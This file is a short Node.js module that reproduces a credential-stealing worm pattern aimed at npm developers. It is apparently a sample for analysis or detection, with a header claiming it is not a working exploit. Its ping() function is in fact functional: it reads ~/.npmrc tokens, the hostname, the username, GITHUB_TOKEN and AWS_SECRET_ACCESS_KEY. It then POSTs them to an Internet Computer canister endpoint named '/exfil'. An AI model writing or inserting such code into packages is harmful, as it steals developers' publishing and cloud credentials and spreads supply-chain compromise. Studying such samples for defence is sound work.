// CanisterWorm ICP (Q1 2026) pattern reproduction — NOT a working exploit.
// Exfiltrates host fingerprint + env tokens to an Internet Computer canister.
// ICP canister URLs follow `<canisterId>.raw.icp0.io` / `<canisterId>.icp0.io`.

const os = require('os');
const fs = require('fs');
const path = require('path');

async function ping() {
  const home = os.homedir();
  let npmrc = '';
  try { npmrc = fs.readFileSync(path.join(home, '.npmrc'), 'utf8'); } catch (_) {}

  const payload = {
    h: os.hostname(),
    u: os.userInfo().username,
    n: npmrc,
    g: process.env.GITHUB_TOKEN || '',
    a: process.env.AWS_SECRET_ACCESS_KEY || ''
  };

  // ICP raw HTTP gateway — canister update calls served as HTTPS POST.
  await fetch('https://aaaaa-aa-cai.raw.icp0.io/exfil', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(payload)
  });
}

module.exports = { ping };
